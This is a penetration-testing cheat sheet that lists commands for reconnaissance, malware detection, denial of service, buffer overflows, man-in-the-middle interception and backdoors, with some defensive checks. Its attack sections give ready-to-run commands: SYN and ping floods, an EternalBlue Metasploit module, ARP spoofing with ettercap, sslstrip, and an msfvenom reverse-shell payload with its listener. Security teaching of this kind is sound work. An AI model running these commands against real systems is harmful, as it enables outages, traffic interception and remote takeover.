# 03 Network & Computer Attacks

## Overview
This cheat sheet provides quick references for **network attacks, malware analysis, and exploitation techniques**. It covers reconnaissance, scanning, exploitation, and mitigation strategies used in penetration testing.

---

## 1. Reconnaissance & Information Gathering

### **Passive Recon**
- **WHOIS Lookup**: `whois target.com`
- **DNS Enumeration**: `nslookup -type=any target.com`
- **Google Dorking**:
  - Find login pages: `site:target.com inurl:login`
  - Exposed documents: `site:target.com filetype:pdf`
  - Default credentials: `"admin" AND "password" filetype:txt`

### **Active Recon**
- **Network Mapping**: `nmap -sn 192.168.1.0/24`
- **Port Scanning**: `nmap -p- -T4 target.com`
- **Service Enumeration**: `nmap -sV -p22,80,443 target.com`
- **Banner Grabbing**: `nc -v target.com 80`
- **OS Fingerprinting**: `nmap -O target.com`

---

## 2. Malware Analysis & Detection

### **Checking for Malware on a System**
- **Process Inspection**:
  ```bash
  ps aux | grep suspicious_process
  ```
- **Check Open Connections**:
  ```bash
  netstat -antup | grep ESTABLISHED
  ```
- **Find Running Services**:
  ```bash
  systemctl list-units --type=service --state=running
  ```
- **Windows Task Listing**:
  ```powershell
  Get-Process | Sort-Object CPU -Descending
  ```

### **Analyzing Suspicious Files**
- **Check File Hash**:
  ```bash
  sha256sum suspicious.exe
  ```
- **Check for Obfuscation**:
  ```bash
  strings suspicious.exe
  ```

### **Detecting Rootkits**
- **Linux Rootkit Detection**:
  ```bash
  chkrootkit
  ```
- **Windows Rootkit Scanner**:
  - Use **GMER** or **RootkitRevealer**

---

## 3. Exploiting Network & Computer Attacks

### **Denial of Service (DoS)**
- **Simple Ping Flood**:
  ```bash
  ping -f -s 65507 target.com
  ```
- **SYN Flood (Hping3)**:
  ```bash
  hping3 -S -p 80 --flood target.com
  ```

### **DDoS Attack Simulation**
- **LOIC/HOIC**: Used for stress testing network availability.
- **Mirai Botnet (IoT Exploit)**: Typically exploits default IoT passwords.

### **Exploiting Buffer Overflows**
- **Fuzzing for Overflow**:
  ```python
  buffer = "A" * 5000
  ```
- **Identifying Vulnerabilities**:
  ```bash
  gdb ./vulnerable_binary
  ```
- **Metasploit Exploit Module**:
  ```bash
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOST target.com
  run
  ```

### **Man-in-the-Middle (MITM) Attacks**
- **ARP Spoofing (Bettercap)**:
  ```bash
  bettercap -iface eth0
  ```
- **Intercept Traffic (Ettercap)**:
  ```bash
  ettercap -Tq -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.100/
  ```
- **SSL Strip**:
  ```bash
  sslstrip -l 8080
  ```

---

## 4. Trojan & Backdoor Exploits

### **Creating a Reverse Shell (Metasploit)**
- **Payload Generation**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
  ```
- **Start a Listener**:
  ```bash
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST 192.168.1.100
  run
  ```

### **Detecting Hidden Processes**
- **Windows**:
  ```powershell
  tasklist /v | findstr /i "suspicious.exe"
  ```
- **Linux**:
  ```bash
  ps aux | grep -E 'nc|bash|sh'
  ```

---

## 5. Detecting & Preventing Attacks

### **Checking System Integrity**
- **Compare with Baseline**:
  ```bash
  tripwire --check
  ```
- **Check for Unauthorized User Accounts**:
  ```bash
  cat /etc/passwd | tail -n 10
  ```

### **Network Defense**
- **Block Malicious IPs (iptables)**:
  ```bash
  iptables -A INPUT -s 192.168.1.200 -j DROP
  ```
- **Monitor Traffic (Tcpdump)**:
  ```bash
  tcpdump -i eth0 -n port 80
  ```
- **Enable System Auditing (Linux Auditd)**:
  ```bash
  auditctl -w /etc/passwd -p wa
  
